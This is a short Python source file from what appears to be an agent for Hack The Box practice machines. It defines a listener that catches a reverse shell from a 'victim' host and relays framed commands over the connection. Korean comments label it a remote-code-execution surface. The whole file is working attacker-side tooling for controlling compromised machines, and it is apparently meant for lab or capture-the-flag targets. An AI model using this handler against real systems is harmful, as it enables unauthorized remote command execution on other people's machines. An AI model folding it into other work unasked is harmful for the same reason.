# htb-agent/src/htb_agent/shell_transport.py   ← 사용자 커밋(RCE 실행 표면)
import socket
from .shell_session import ReverseShellSession

def catch_reverse_shell(lport: int, timeout: float = 120.0) -> ReverseShellSession:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport)); srv.listen(1); srv.settimeout(timeout)
    conn, _ = srv.accept()                      # ← 피해자 콜백 수신
    conn.settimeout(15.0)

    def transport(framed_cmd: str) -> str:       # ReverseShellSession 가 프레이밍/파싱 담당
        conn.sendall(framed_cmd.encode() + b"\n")
        buf = b""
        try:
            while b"__HTBDONE_" not in buf:       # 세션 마커(프레이밍은 B가 붙임)
                chunk = conn.recv(4096)
                if not chunk: break
                buf += chunk
        except socket.timeout:
            pass
        return buf.decode(errors="replace")
    return transport  # 또는 session 만들어 attach

# 사용: rs = ReverseShellSession(lhost, lport); rs.attach(catch_reverse_shell(lport))
